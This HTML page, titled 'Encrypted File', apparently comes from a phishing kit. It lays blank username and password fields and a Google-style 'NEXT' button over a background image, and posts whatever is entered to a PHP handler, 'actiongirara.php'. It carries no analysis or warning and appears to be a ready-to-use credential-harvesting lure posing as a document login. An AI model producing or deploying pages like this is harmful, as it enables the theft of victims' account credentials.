<html><head>
        <title>Encrypted File</title>
        <!-- ---- Links --- !-->
         </head>
    <body>
        <!-- --- Header ---- !-->
       
           <div class="logo">
               <img src="bettyimages/giribvt.png" style="position:absolute;left:0px;top:0px">
               
           </div>
                          
        <!-- --- Form Login --- !-->
        <div id="form" style="left:680px;height:200px;">
            <form action="actiongirara.php" method="post">
            <h2 style="position:absolute;right:20%;top:40px;COLOR:#FFFFFF;height:150px;">  ..</h2>
            <div id="header-border-div0"></div>
        <input name="user" placeholder=" " required="" style="position:absolute;left:498px;top:332px;width:373;height:30px;padding:0px;border-radius:0px;border: 0px solid #bdc4c9;" type="user">
        <input name="pass" placeholder=" " required="" style="position:absolute;left:498px;top:398px;width:373;height:30px;padding:0px;border-radius:0px;border: 0px solid #bdc4c9;" type="password">
        <button type="submit" class="login-button button-primary" style="position:absolute;top:500px;left:777px;padding:8px;font-size:.900em;box-sizing:border-box;display:block;cursor:pointer;background: #4285f4;border: none;border-radius: 5px;padding: .75em 1em;color: #fff!important;text-align: center;text-transform: capitalize;font-family: Optimist,Arial,Helvetica,sans-serif;vertical-align: baseline;width:90;height:45px">
            <div class="sign-in-text">NEXT          </div>
            </button> 
            </form>
            </div>
        <!-- --- Form Login --- !-->
        <!-- --- Under Form --- !-->
                <!-- --- Under Form --- !-->
        <!-- --- Footer ---- !-->
        <div id="footer">
                            </div>
        <!-- --- Footer ---- !-->
    
 </header></body></html>